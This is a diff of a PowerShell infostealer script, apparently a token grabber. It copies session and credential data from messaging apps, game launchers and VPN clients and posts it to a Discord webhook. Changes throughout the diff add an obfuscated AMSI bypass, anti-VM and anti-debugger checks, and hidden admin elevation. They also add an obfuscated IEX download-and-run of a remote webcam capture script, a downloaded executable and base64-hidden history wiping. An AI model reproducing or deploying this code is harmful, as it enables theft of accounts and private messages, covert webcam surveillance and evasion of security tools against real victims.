@@ -1,12 +1,14 @@
-# Single Instance (no overloads)
-function Compare-Mutex {
-    $AppId = "16fcb8bb-e281-472d-a9f6-39f0f32f19f2" # This GUID string is changeable
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+
+function KDMUTEX {
+    $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if( -not $CreatedNew ) {
         throw "An instance of this script is already running."
     } else {
-        Invoke-ANTITOTAL
+        VMBYPASSER
     }
 }
 
@@ -14,17 +16,14 @@ Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 $webhook = "YOUR_WEBHOOK_HERE"
 $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-$debug_mode = $false
-$udc_mode = $true
 
-if (!($debug_mode)) {
-    $ErrorActionPreference = 'SilentlyContinue'
-    $ProgressPreference = 'SilentlyContinue'
-}
 
-function Invoke-Admin_Check {
-    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-    return $test
+# Request admin with AMSI bypass
+function INVOKE-AC {
+	${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siInitFailed','NonPublic,Static');
+    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp"))|&([regex]::Unescape("\u0069\u0065\u0078"))
+    $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+    return $kdotcheck
 }
 
 function Hide-Console
@@ -99,53 +98,50 @@ function ram_check {
     }
 }
 
-function Invoke-ANTIVM {
+function VMBYPASSER {
 	ram_check
     $processnames= @(
-            "autoruns",
-            "autorunsc",
-            "dumpcap",
-            "fiddler",
-            "fakenet",
-            "hookexplorer",
-            "immunitydebugger",
-            "httpdebugger",
-            "importrec",
-            "lordpe",
-            "petools",
-            "processhacker",
-            "resourcehacker",
-            "scylla_x64",
-            "sandman",
-            "sysinspector",
-            "tcpview",
-            "die",
-            "dumpcap",
-            "filemon",
-            "idaq",
-            "idaq64",
-            "joeboxcontrol",
-            "joeboxserver",
-            "ollydbg",
-            "proc_analyzer",
-            "procexp",
-            "procmon",
-            "pestudio",
-            "qemu-ga",
-            "qga",
-            "regmon",
-            "sniff_hit",
-            "sysanalyzer",
-            "tcpview",
-            "windbg",
-            "wireshark",
-            "x32dbg",
-            "x64dbg",
-            "vmwareuser",
-            "vmacthlp",
-            "vboxservice",
-            "vboxtray",
-            "xenservice"
+   "autoruns",
+   "die",
+   "dumpcap",
+   "dumpcap",
+   "fakenet",
+   "fiddler",
+   "filemon",
+   "hookexplorer",
+   "httpdebugger",
+   "immunitydebugger",
+   "importrec",
+   "joeboxcontrol",
+   "joeboxserver",
+   "lordpe",
+   "ollydbg",
+   "petools",
+   "proc_analyzer",
+   "processhacker",
+   "procexp",
+   "procmon",
+   "qemu-ga",
+   "qga",
+   "resourcehacker",
+   "sandman",
+   "scylla_x64",
+   "sysanalyzer",
+   "sysinspector",
+   "sysmon",
+   "tcpview",
+   "tcpview64",
+   "tcpdump",
+   "vboxservice",
+   "vboxtray",
+   "vboxcontrol",
+   "vmacthlp",
+   "vmwareuser",
+   "windbg",
+   "wireshark",
+   "x32dbg",
+   "x64dbg",
+   "xenservice"
         )
     $detectedProcesses = $processnames | ForEach-Object {
         $processName = $_
@@ -155,7 +151,7 @@ function Invoke-ANTIVM {
     }
 
     if ($null -eq $detectedProcesses) { 
-        Invoke-TASKS
+        Invoke-ANTITOTAL
     }
     else { 
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
@@ -197,7 +193,7 @@ function Invoke-ANTITOTAL {
             ""
         }
     }
-    Invoke-ANTIVM
+    Invoke-TASKS
 }
 
 function HOSTS-BLOCKER {
@@ -215,20 +211,17 @@ foreach ($browser in $Browsers) {
 }
 Start-Sleep -Seconds 4
 foreach ($browser in $terminatedProcesses) {
-   Start-Process $browser -ErrorAction SilentlyContinue
+   Start-Process $browser 
 }
    return $terminatedProcesses
 }
 }
 
+
 function Request-Admin {
-    while(!(Invoke-Admin_Check)) {
+    while(!(INVOKE-AC)) {
         try {
-            if ($debug_mode) {
-                Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-            } else {
-                Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
-            }
+            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
             exit
         }
         catch {}
@@ -355,7 +348,7 @@ function Backup-Data {
         $processname = "telegram"
         $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
         if (!(Test-Path $pathtele)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname -ErrorAction SilentlyContinue | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname  | Stop-Process }} catch {}
         $destination = "$folder_messaging\Telegram.zip"
         $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
         $files = Get-ChildItem -Path $pathtele -Exclude $exclude
@@ -368,14 +361,14 @@ function Backup-Data {
         $processname = "element"
         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
         if (!(Test-Path $elementfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname -ErrorAction SilentlyContinue | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname  | Stop-Process }} catch {}
         $element_session = "$folder_messaging\Element"
         New-Item -ItemType Directory -Force -Path $element_session
-        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force -ErrorAction SilentlyContinue
-        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force -ErrorAction SilentlyContinue
-        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force -ErrorAction SilentlyContinue
-        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force -ErrorAction SilentlyContinue
-        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force -ErrorAction SilentlyContinue
+        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
+        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
+        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force 
+        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
+        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force 
     }
     
 	
@@ -384,10 +377,10 @@ function Backup-Data {
         $processname = "icq"
         $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
         if (!(Test-Path $icqfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname -ErrorAction SilentlyContinue | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname  | Stop-Process }} catch {}
         $icq_session = "$folder_messaging\ICQ"
-        New-Item -ItemType Directory -Force -Path $icq_session -ErrorAction SilentlyContinue
-        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force -ErrorAction SilentlyContinue
+        New-Item -ItemType Directory -Force -Path $icq_session 
+        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
     }
     
         
@@ -396,7 +389,7 @@ function Backup-Data {
         $processname = "signal"
         $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
         if (!(Test-Path $signalfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $signal_session = "$folder_messaging\Signal"
         New-Item -ItemType Directory -Force -Path $signal_session
         Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
@@ -412,7 +405,7 @@ function Backup-Data {
         $processname = "viber"
         $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
         if (!(Test-Path $viberfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $viber_session = "$folder_messaging\Viber"
         New-Item -ItemType Directory -Force -Path $viber_session
         $configfiles = @("config$1")
@@ -439,7 +432,7 @@ function Backup-Data {
 	# Whatsapp Session Stealer
     function whatsappstealer {
         $processname = "whatsapp"
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $whatsapp_session = "$folder_messaging\Whatsapp"
         New-Item -ItemType Directory -Force -Path $whatsapp_session
         $regexPattern = "WhatsAppDesktop"
@@ -452,16 +445,14 @@ function Backup-Data {
             }
         }
     }
-
-	
-	
+		
 	# All Gaming Sessions
 	# Steam Session Stealer
     function steamstealer {
         $processname = "steam"
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
         if (!(Test-Path $steamfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $steam_session = "$folder_gaming\Steam"
         New-Item -ItemType Directory -Force -Path $steam_session
         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
@@ -479,8 +470,8 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $minecraft_session
         $minecraftfolder1 = $env:appdata + "\.minecraft"
         $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
-        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session -ErrorAction SilentlyContinue
-        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session -ErrorAction SilentlyContinue
+        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
+        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
     }
     
     # Epicgames Session Stealer
@@ -488,7 +479,7 @@ function Backup-Data {
         $processname = "epicgameslauncher"
         $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
         if (!(Test-Path $epicgamesfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $epicgames_session = "$folder_gaming\EpicGames"
         New-Item -ItemType Directory -Force -Path $epicgames_session
         Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
@@ -501,7 +492,7 @@ function Backup-Data {
         $processname = "upc"
         $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
         if (!(Test-Path $ubisoftfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $ubisoft_session = "$folder_gaming\Ubisoft"
         New-Item -ItemType Directory -Force -Path $ubisoft_session
         Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
@@ -514,7 +505,7 @@ function Backup-Data {
         if (!(Test-Path $eafolder)) {return}
         $ea_session = "$folder_gaming\Electronic Arts"
         if (!(Test-Path $ea_session)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         New-Item -ItemType Directory -Force -Path $ea_session
         Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
@@ -525,7 +516,7 @@ function Backup-Data {
         $growtopiafolder = "$env:localappdata\Growtopia"
         if (!(Test-Path $growtopiafolder)) {return}
         $growtopia_session = "$folder_gaming\Growtopia"
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         New-Item -ItemType Directory -Force -Path $growtopia_session
         Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
     }
@@ -538,7 +529,7 @@ function Backup-Data {
         $processname = "nordvpn"
         $nordvpnfolder = "$env:localappdata\nordvpn"
         if (!(Test-Path $nordvpnfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $nordvpn_account = "$folder_vpn\NordVPN"
         New-Item -ItemType Directory -Force -Path $nordvpn_account
         $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
@@ -562,7 +553,7 @@ function Backup-Data {
         $processname = "protonvpn"
         $protonvpnfolder = "$env:localappdata\protonvpn"  
         if (!(Test-Path $protonvpnfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $protonvpn_account = "$folder_vpn\ProtonVPN"
         New-Item -ItemType Directory -Force -Path $protonvpn_account
 		$pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
@@ -585,7 +576,7 @@ function Backup-Data {
         $processname = "Surfshark"
         $surfsharkvpnfolder = "$env:appdata\Surfshark"
         if (!(Test-Path $surfsharkvpnfolder)) {return}
-        try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
+        try {if (Get-Process $processname  ) {Get-Process -Name $processname | Stop-Process }} catch {}
         $surfsharkvpn_account = "$folder_vpn\Surfshark"
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
 		Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
@@ -733,174 +724,12 @@ function Backup-Data {
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 
-    function Get-WebCamImage {
-    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
-    $source=@" 
-    using System; 
-    using System.Collections.Generic; 
-    using System.Text; 
-    using System.Collections; 
-    using System.Runtime.InteropServices; 
-    using System.ComponentModel; 
-    using System.Data; 
-    using System.Drawing; 
-    using System.Windows.Forms; 
-    
-    namespace WebCamLib 
-    { 
-        public class Device 
-        { 
-            private const short WM_CAP = 0x400; 
-            private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
-            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
-            private const int WM_CAP_EDIT_COPY = 0x41e; 
-            private const int WM_CAP_SET_PREVIEW = 0x432; 
-            private const int WM_CAP_SET_OVERLAY = 0x433; 
-            private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
-            private const int WM_CAP_SET_SCALE = 0x435; 
-            private const int WS_CHILD = 0x40000000; 
-            private const int WS_VISIBLE = 0x10000000; 
-    
-            [DllImport("avicap32.dll")] 
-            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
-                int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
-    
-            [DllImport("user32", EntryPoint = "SendMessageA")] 
-            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
-    
-            [DllImport("user32")] 
-            protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
-    
-            [DllImport("user32")] 
-            protected static extern bool DestroyWindow(int hwnd); 
-                    
-            int index; 
-            int deviceHandle; 
-    
-            public Device(int index) 
-            { 
-                this.index = index; 
-            } 
-    
-            private string _name; 
-    
-            public string Name 
-            { 
-                get { return _name; } 
-                set { _name = value; } 
-            } 
-    
-            private string _version; 
-    
-            public string Version 
-            { 
-                get { return _version; } 
-                set { _version = value; } 
-            } 
-    
-            public override string ToString() 
-            { 
-                return this.Name; 
-            } 
-    
-            public void Init(int windowHeight, int windowWidth, int handle) 
-            { 
-                string deviceIndex = Convert.ToString(this.index); 
-                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
-    
-                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
-                { 
-                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
-                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
-                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
-                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
-                } 
-            } 
-    
-            public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
-            { 
-                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
-            } 
-            
-            public void CopyC() 
-            { 
-                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
-            } 
-    
-            public void Stop() 
-            { 
-                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
-                DestroyWindow(deviceHandle); 
-            } 
-        } 
-        
-        public class DeviceManager 
-        { 
-            [DllImport("avicap32.dll")] 
-            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
-                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
-            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
-    
-            static ArrayList devices = new ArrayList(); 
-    
-            public static Device[] GetAllDevices() 
-            { 
-                String dName = "".PadRight(100); 
-                String dVersion = "".PadRight(100); 
-    
-                for (short i = 0; i < 10; i++) 
-                { 
-                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
-                    { 
-                        Device d = new Device(i); 
-                        d.Name = dName.Trim(); 
-                        d.Version = dVersion.Trim(); 
-                        devices.Add(d);                     
-                    } 
-                } 
-    
-                return (Device[])devices.ToArray(typeof(Device)); 
-            } 
-    
-            public static Device GetDevice(int deviceIndex) 
-            { 
-                return (Device)devices[deviceIndex]; 
-            } 
-        } 
-    } 
-"@ 
-    Add-Type -AssemblyName System.Drawing  
-    $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
-    Where-Object { $_.FormatDescription -eq "JPEG" }       
-    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
-    try {
-        [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
-        [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
-        $picCapture = New-Object System.Windows.Forms.PictureBox 
-        try {
-            $devices = [WebCamLib.DeviceManager]::GetAllDevices()
-        } catch {
-			Write-Host "No camera found"
-			
-		}
-        $count = 0
-        foreach ($device in $devices) {
-            $imagePath = "$folder_general\out$count.jpg"
-            $device.ShowWindow($picCapture)
-            $device.CopyC()
-            $bitmap = [Windows.Forms.Clipboard]::GetImage()
-            $bitmap.Save($imagePath, $jpegCodec, $ep)
-            $bitmap.dispose()
-            $count++
-            [Windows.Forms.Clipboard]::Clear()
-        }
-
-    } catch {
-		Write-Host "No camera found"
+   # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
+    function Get-WebcamIMG {
 		
+		I'E'X(New-Object Net.WebClient).”`D`o`wn`l`oa`d`Str`in`g”("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/webcam.ps1")
 	}
-    }
- try {Get-WebCamImage} catch {}
+	Get-WebcamIMG
 
     Function Invoke-GrabFiles {
     $grabber = @(
@@ -977,14 +806,14 @@ function Backup-Data {
     }
 
     try {
-        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction SilentlyContinue | Out-Null
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force  | Out-Null
     } catch {}
 
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
-    Stop-Process -Name "discord" -Force -ErrorAction SilentlyContinue | Out-Null
-    Stop-Process -Name "discordcanary" -Force -ErrorAction SilentlyContinue | Out-Null
-    Stop-Process -Name "discordptb" -Force -ErrorAction SilentlyContinue | Out-Null
+    Stop-Process -Name "discord" -Force  | Out-Null
+    Stop-Process -Name "discordcanary" -Force  | Out-Null
+    Stop-Process -Name "discordptb" -Force  | Out-Null
 
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
@@ -1044,19 +873,10 @@ function Invoke-TASKS {
 	Backup-Data
 }
 
-if (Invoke-Admin_Check -eq $true) {
-    if (!($debug_mode)) {
-        Hide-Console
-    }
-    try {
-        Remove-Item (Get-PSreadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
-    } catch {}
-    Compare-Mutex
-    # Self-Destruct
-    # Remove-Item $PSCommandPath -Force
-    if ($debug_mode) {
-        Start-Sleep -s 10000
-    }
+if (INVOKE-AC -eq $true) {
+   Hide-Console
+   KDMUTEX
+   I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
